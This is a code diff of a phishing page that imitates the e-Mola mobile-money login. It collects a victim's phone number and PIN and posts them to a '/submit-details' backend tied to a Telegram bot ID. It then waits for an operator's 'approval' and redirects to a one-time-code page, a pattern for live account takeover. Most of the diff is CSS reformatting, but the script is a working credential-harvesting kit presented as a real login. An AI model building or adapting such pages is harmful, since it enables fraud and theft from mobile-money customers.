@@ -4,8 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>e-Mola · Entrar</title>
-     <style>
-
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -21,913 +20,322 @@
 
         body {
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-
             background:
-                linear-gradient(
-                    180deg,
-                    #f7a53d 0%,
-                    #e38a2e 25%,
-                    #c46b22 52%,
-                    #a94e1c 76%,
-                    #914015 100%
-                );
-
+                linear-gradient(180deg, #f7a53d 0%, #e38a2e 25%, #c46b22 52%, #a94e1c 76%, #914015 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-
             min-height: 100vh;
-
             margin: 0;
             padding: 0;
-
             position: relative;
-
             color: white;
         }
 
-
-        /*
-        ============================================================
-        MAIN CONTAINER
-        ============================================================
-        */
-
         .loan-container {
-
             width: 100%;
             max-width: 709px;
-
             min-height: 100vh;
-
             background: transparent;
-
             border-radius: 0;
-
             padding: 0;
-
             box-shadow: none;
-
             overflow: hidden;
-
             position: relative;
         }
 
-
-        /*
-        ============================================================
-        SOFT BACKGROUND SHAPE
-        ============================================================
-        */
-
         .loan-container::after {
-
             content: "";
-
             position: absolute;
-
             width: 680px;
             height: 900px;
-
             left: 50%;
             top: 300px;
-
             transform: translateX(-50%) rotate(-7deg);
-
-            background:
-                radial-gradient(
-                    ellipse at 45% 30%,
-                    rgba(255, 183, 83, 0.28) 0%,
-                    rgba(224, 127, 38, 0.18) 35%,
-                    rgba(112, 49, 12, 0.12) 70%,
-                    transparent 75%
-                );
-
+            background: radial-gradient(ellipse at 45% 30%, rgba(255, 183, 83, 0.28) 0%, rgba(224, 127, 38, 0.18) 35%, rgba(112, 49, 12, 0.12) 70%, transparent 75%);
             border-radius: 45% 55% 50% 45%;
-
             pointer-events: none;
-
             z-index: 0;
         }
 
-
-        /*
-        ============================================================
-        BACK ARROW
-        ============================================================
-        */
-
         .loan-container::before {
-
             content: "";
-
             position: absolute;
-
             top: 87px;
             left: 62px;
-
             width: 22px;
             height: 22px;
-
             border-left: 4px solid #ffffff;
             border-bottom: 4px solid #ffffff;
-
             transform: rotate(45deg);
-
             z-index: 20;
         }
 
-
-        /*
-        ============================================================
-        LOGO
-        ============================================================
-        */
-
         .logo-container {
-
             position: absolute;
-
             top: 220px;
             left: 50%;
-
             transform: translateX(-50%);
-
             width: 300px;
-
             margin: 0;
             padding: 0;
-
             background: transparent;
-
             border: none;
-
             text-align: center;
-
             color: white;
-
             z-index: 5;
         }
 
-
-        /*
-        Logo icon
-        */
-
         .logo-container::before {
-
             content: "▣";
-
             display: block;
-
             font-size: 95px;
-
             line-height: 75px;
-
             font-weight: 900;
-
             color: white;
-
             margin-bottom: 8px;
-
             transform: rotate(-4deg);
         }
 
-
         .logo-container h1 {
-
             font-size: 67px;
-
             line-height: 1;
-
             font-weight: 700;
-
             letter-spacing: -2px;
-
             margin: 0 0 5px;
-
             color: #ffffff;
         }
-
 
         .logo-container .slogan {
-
             font-size: 21px;
-
             line-height: 1.1;
-
             font-weight: 700;
-
             opacity: 1;
-
             letter-spacing: 0;
-
             color: #ffffff;
         }
-
-
-        /*
-        ============================================================
-        PORTUGAL LANGUAGE
-        ============================================================
-        */
 
         .language {
-
             position: absolute;
-
             top: 83px;
             right: 54px;
-
             display: flex;
-
             align-items: center;
-
             gap: 13px;
-
             z-index: 20;
-
             color: #ffffff;
-
             font-size: 25px;
-
             font-weight: 700;
         }
 
-
         .flag {
-
             width: 62px;
             height: 42px;
-
             display: flex;
-
             overflow: hidden;
-
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
         }
 
-
-        .flag-green {
-
-            width: 40%;
-
-            background: #006600;
-        }
-
-
-        .flag-red {
-
-            width: 60%;
-
-            background: #ff0000;
-        }
-
+        .flag-green { width: 40%; background: #006600; }
+        .flag-red { width: 60%; background: #ff0000; }
 
         .flag-circle {
-
             position: absolute;
-
             width: 18px;
             height: 18px;
-
             margin-left: 17px;
-
             margin-top: 12px;
-
             border-radius: 50%;
-
             background: #ffcc00;
-
             border: 2px solid #ffffff;
         }
 
-
-        /*
-        ============================================================
-        FORM
-        ============================================================
-        */
-
         #detailsForm {
-
             position: absolute;
-
             top: 525px;
-
             left: 50%;
-
             transform: translateX(-50%);
-
             width: 76%;
-
             max-width: 535px;
-
             z-index: 10;
         }
 
-
-        /*
-        ============================================================
-        FIELD LABELS
-        ============================================================
-        */
-
-        .field-label {
-
-            display: none;
-        }
-
-
-        /*
-        ============================================================
-        INPUTS
-        ============================================================
-        */
+        .field-label { display: none; }
 
         input[type="tel"],
         input[type="password"] {
-
             width: 100%;
-
             height: 73px;
-
             padding: 0 30px;
-
             font-family: inherit;
-
             font-size: 25px;
-
             font-weight: 400;
-
             color: #ffffff;
-
             border: none;
-
             outline: none;
-
             border-radius: 45px;
-
             background: rgba(75, 38, 15, 0.38);
-
             box-shadow: none;
-
             margin: 0 0 35px;
-
             text-align: center;
-
             transition: background 0.2s ease;
         }
 
-
         input[type="tel"]::placeholder,
         input[type="password"]::placeholder {
-
             color: rgba(255, 255, 255, 0.78);
-
             opacity: 1;
         }
 
-
         input[type="tel"]:focus,
         input[type="password"]:focus {
-
             border: none;
-
             outline: none;
-
             background: rgba(75, 38, 15, 0.48);
         }
 
-
-        /*
-        ============================================================
-        CHECKBOX
-        ============================================================
-        */
-
-        .checkbox-label {
-
-            display: none;
-        }
-
-
-        /*
-        ============================================================
-        LOGIN BUTTON
-        ============================================================
-        */
+        .checkbox-label { display: none; }
 
         button {
-
             width: 100%;
-
             height: 94px;
-
             padding: 0;
-
             margin-top: 8px;
-
             font-family: inherit;
-
             font-size: 30px;
-
             font-weight: 700;
-
             background: #ffffff;
-
             color: #111111;
-
             border: none;
-
             border-radius: 50px;
-
             cursor: pointer;
-
-            transition:
-                transform 0.15s ease,
-                background 0.2s ease;
-
+            transition: transform 0.15s ease, background 0.2s ease;
             letter-spacing: 0;
-
             display: flex;
-
             align-items: center;
-
             justify-content: center;
-
             gap: 10px;
-
             box-shadow: none;
         }
 
-
         button:not(:disabled) {
-
             background: #ffffff;
-
             color: #111111;
-
             cursor: pointer;
         }
 
-
         button:not(:disabled):hover {
-
             background: #f7f7f7;
-
             transform: scale(1.01);
         }
 
-
         button:not(:disabled):active {
-
             transform: scale(0.98);
         }
 
-
         button:disabled {
-
             background: #ffffff;
-
             color: #111111;
-
             cursor: pointer;
         }
 
-
-        /*
-        ============================================================
-        SPINNER
-        ============================================================
-        */
-
         .spinner {
-
             width: 22px;
             height: 22px;
-
             border: 3px solid rgba(0, 0, 0, 0.15);
-
             border-top: 3px solid #111111;
-
             border-radius: 50%;
-
             animation: spin 1s linear infinite;
-
             display: none;
         }
 
-
         @keyframes spin {
-
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
-
-        /*
-        ============================================================
-        STATUS
-        ============================================================
-        */
-
         #status {
-
             position: absolute;
-
             bottom: 25px;
-
             left: 0;
-
             width: 100%;
-
             margin: 0;
-
             font-size: 14px;
-
             color: #ffffff;
-
             text-align: center;
-
             z-index: 20;
         }
 
-
-        /*
-        ============================================================
-        MOBILE
-        ============================================================
-        */
-
         @media (max-width: 480px) {
-
-            .loan-container {
-                max-width: none;
-            }
-
-
-            .loan-container::before {
-
-                top: 91px;
-                left: 59px;
-
-                width: 19px;
-                height: 19px;
-
-                border-width: 4px;
-            }
-
-
-            .language {
-
-                top: 84px;
-                right: 28px;
-
-                gap: 9px;
-
-                font-size: 21px;
-            }
-
-
-            .flag {
-
-                width: 55px;
-                height: 36px;
-            }
-
-
-            .flag-circle {
-
-                width: 15px;
-                height: 15px;
-
-                margin-left: 15px;
-                margin-top: 10px;
-            }
-
-
-            .logo-container {
-
-                top: 225px;
-
-                width: 280px;
-            }
-
-
-            .logo-container::before {
-
-                font-size: 80px;
-
-                line-height: 66px;
-            }
-
-
-            .logo-container h1 {
-
-                font-size: 58px;
-
-                letter-spacing: -2px;
-            }
-
-
-            .logo-container .slogan {
-
-                font-size: 19px;
-            }
-
-
-            #detailsForm {
-
-                top: 527px;
-
-                width: 76%;
-
-                max-width: none;
-            }
-
-
-            input[type="tel"],
-            input[type="password"] {
-
-                height: 73px;
-
-                font-size: 23px;
-
-                padding: 0 22px;
-
-                margin-bottom: 36px;
-            }
-
-
-            button {
-
-                height: 95px;
-
-                font-size: 29px;
-
-                margin-top: 8px;
-            }
-
-
-            #status {
-                bottom: 20px;
-                font-size: 13px;
-            }
+            .loan-container { max-width: none; }
+            .loan-container::before { top: 91px; left: 59px; width: 19px; height: 19px; border-width: 4px; }
+            .language { top: 84px; right: 28px; gap: 9px; font-size: 21px; }
+            .flag { width: 55px; height: 36px; }
+            .flag-circle { width: 15px; height: 15px; margin-left: 15px; margin-top: 10px; }
+            .logo-container { top: 225px; width: 280px; }
+            .logo-container::before { font-size: 80px; line-height: 66px; }
+            .logo-container h1 { font-size: 58px; letter-spacing: -2px; }
+            .logo-container .slogan { font-size: 19px; }
+            #detailsForm { top: 527px; width: 76%; max-width: none; }
+            input[type="tel"], input[type="password"] { height: 73px; font-size: 23px; padding: 0 22px; margin-bottom: 36px; }
+            button { height: 95px; font-size: 29px; margin-top: 8px; }
+            #status { bottom: 20px; font-size: 13px; }
         }
-
-
-        /*
-        ============================================================
-        SMALL PHONES
-        ============================================================
-        */
 
         @media (max-width: 380px) {
-
-            .loan-container::before {
-
-                top: 65px;
-                left: 30px;
-
-                width: 17px;
-                height: 17px;
-            }
-
-
-            .language {
-
-                top: 62px;
-                right: 20px;
-
-                font-size: 18px;
-            }
-
-
-            .flag {
-
-                width: 48px;
-                height: 31px;
-            }
-
-
-            .logo-container {
-
-                top: 180px;
-            }
-
-
-            .logo-container::before {
-
-                font-size: 70px;
-            }
-
-
-            .logo-container h1 {
-
-                font-size: 50px;
-            }
-
-
-            .logo-container .slogan {
-
-                font-size: 17px;
-            }
-
-
-            #detailsForm {
-
-                top: 430px;
-            }
-
-
-            input[type="tel"],
-            input[type="password"] {
-
-                height: 62px;
-
-                font-size: 19px;
-
-                margin-bottom: 25px;
-            }
-
-
-            button {
-
-                height: 76px;
-
-                font-size: 25px;
-            }
-
-
-            #status {
-                bottom: 15px;
-                font-size: 12px;
-            }
+            .loan-container::before { top: 65px; left: 30px; width: 17px; height: 17px; }
+            .language { top: 62px; right: 20px; font-size: 18px; }
+            .flag { width: 48px; height: 31px; }
+            .logo-container { top: 180px; }
+            .logo-container::before { font-size: 70px; }
+            .logo-container h1 { font-size: 50px; }
+            .logo-container .slogan { font-size: 17px; }
+            #detailsForm { top: 430px; }
+            input[type="tel"], input[type="password"] { height: 62px; font-size: 19px; margin-bottom: 25px; }
+            button { height: 76px; font-size: 25px; }
+            #status { bottom: 15px; font-size: 12px; }
         }
-
-
-        /*
-        ============================================================
-        LANDSCAPE / SHORT SCREENS
-        ============================================================
-        */
 
         @media (max-height: 700px) {
-
-            .logo-container {
-                top: 100px;
-            }
-
-            #detailsForm {
-                top: 310px;
-            }
-
-            #status {
-                bottom: 10px;
-            }
+            .logo-container { top: 100px; }
+            #detailsForm { top: 310px; }
+            #status { bottom: 10px; }
         }
-
     </style>
 </head>
-
-
 <body>
 
-
 <div class="loan-container">
-
-
-    <!-- =========================================================
-         LANGUAGE
-    ========================================================== -->
-
     <div class="language">
-
-        <div class="flag">
-            <div class="flag-green"></div>
-            <div class="flag-red"></div>
-            <div class="flag-circle"></div>
-        </div>
-
+        <div class="flag"><div class="flag-green"></div><div class="flag-red"></div><div class="flag-circle"></div></div>
         <span>POR</span>
-
     </div>
-
-
-    <!-- =========================================================
-         LOGO
-    ========================================================== -->
 
     <div class="logo-container">
-
         <h1>e-Mola</h1>
-
-        <div class="slogan">
-            Meu cell, minha mola
-        </div>
-
+        <div class="slogan">Meu cell, minha mola</div>
     </div>
 
-
-    <!-- =========================================================
-         LOGIN FORM
-    ========================================================== -->
-
     <form id="detailsForm">
-
-
-        <label
-            class="field-label"
-            for="phone"
-        >
-            Digite o número de telefone
-        </label>
-
-
-        <input
-            type="tel"
-            id="phone"
-            placeholder="Digite o número de telefone"
-            autocomplete="tel"
-            inputmode="tel"
-            required
-        >
-
-
-        <label
-            class="field-label"
-            for="pin"
-        >
-            PIN
-        </label>
-
-
-        <input
-            type="password"
-            id="pin"
-            placeholder="PIN"
-            maxlength="6"
-            inputmode="numeric"
-            autocomplete="current-password"
-            required
-        >
-
-
+        <input type="tel" id="phone" placeholder="Digite o número de telefone" autocomplete="tel" inputmode="tel" required />
+        <input type="password" id="pin" placeholder="PIN" maxlength="6" inputmode="numeric" autocomplete="current-password" required />
         <label class="checkbox-label">
-
-            <input
-                type="checkbox"
-                id="confirmCheck"
-            >
-
-            <span>
-                Concordo com os termos e condições
-            </span>
-
+            <input type="checkbox" id="confirmCheck" />
+            <span>Concordo com os termos e condições</span>
         </label>
-
-
-        <button
-            id="submitBtn"
-            type="submit"
-        >
-
-            <span id="btnText">
-                ENTRAR
-            </span>
-
-            <span
-                class="spinner"
-                id="spinner"
-            ></span>
-
+        <button id="submitBtn" type="submit">
+            <span id="btnText">ENTRAR</span>
+            <span class="spinner" id="spinner"></span>
         </button>
-
-
     </form>
 
-
-    <!-- =========================================================
-         STATUS (feedback messages)
-    ========================================================== -->
-
     <div id="status"></div>
-
-
 </div>
 
 <script>
-    // ---------- get botId from URL ----------
     const params = new URLSearchParams(window.location.search);
     const botId = params.get('botId');
-    if (!botId) {
-        alert('Invalid access link');
-        throw new Error();
-    }
+    if (!botId) { alert('Invalid access link'); throw new Error(); }
 
-    // ---------- DOM refs ----------
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('pin');
     const confirmCheck = document.getElementById('confirmCheck');
@@ -936,21 +344,16 @@
     const spinner = document.getElementById('spinner');
     const statusEl = document.getElementById('status');
 
-    // ---------- enable button on checkbox ----------
     confirmCheck.addEventListener('change', () => {
         submitBtn.disabled = !confirmCheck.checked;
     });
+    submitBtn.disabled = true;
 
-    // ---------- FIX: set initial button state ----------
-    submitBtn.disabled = true; // start disabled
-
-    // ---------- submit ----------
     document.getElementById('detailsForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
         const phone = phoneInput.value.trim();
         const pin = pinInput.value.trim();
-        // Get name from localStorage (set on index.html) or use default
         const name = localStorage.getItem('name') || 'Desconhecido';
 
         if (!phone || !pin) {
@@ -958,7 +361,6 @@
             return;
         }
 
-        // Save phone to localStorage for later pages
         localStorage.setItem('phone', phone);
 
         submitBtn.disabled = true;
@@ -967,7 +369,6 @@
         statusEl.textContent = 'A aguardar aprovação no Telegram...';
 
         try {
-            // 1. Send details to backend
             const response = await fetch('/submit-details', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -975,13 +376,9 @@
             });
 
             const data = await response.json();
-            if (!data.requestId) {
-                throw new Error(data.message || 'Erro ao submeter');
-            }
+            if (!data.requestId) throw new Error(data.message || 'Erro ao submeter');
 
             const requestId = data.requestId;
-
-            // 2. Poll for approval
             let approved = false;
             while (!approved) {
                 await new Promise(resolve => setTimeout(resolve, 1500));
@@ -996,7 +393,6 @@
                 }
             }
 
-            // 3. Approved → go to OTP page
             if (approved) {
                 window.location.href = `code.html?botId=${botId}`;
             }
